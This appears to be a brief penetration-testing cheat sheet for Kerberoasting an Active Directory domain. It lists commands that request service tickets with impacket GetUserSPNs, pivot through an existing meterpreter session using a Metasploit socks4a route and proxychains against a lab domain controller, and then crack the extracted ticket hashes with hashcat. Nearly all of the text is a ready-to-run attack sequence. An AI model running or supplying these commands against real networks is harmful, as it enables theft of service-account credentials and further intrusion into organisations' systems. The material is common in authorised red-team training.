impacket-GetUserSPNS -request -dc-ip <ip> <domain>/<user>

Need an established meterpeter session.
Next, we set a route in Metasploit to cover the internal subnet that contains the IP address of a Domain Controller.
msf auxiliary/server/socks4a
route add <subnet>
set srvrport 8080
run

Now we are all set to use one of the Impacket example scripts and a valid and unprivileged domain account to gather Kerberos tickets advertised via SPN using proxychains over the meterpreter session.
proxychains GetUserSPNs.py -request -dc-ip 192.168.2.160 lab.local/zuul

Any Kerberos tickets gathered by the GetUserSPNs script directly crackable with Hashcat without any additional conversion (the hash type was added in version 3.0).
hashcat -m 13100 -a 0 sqladmin_kerberos.txt crackstation.txt
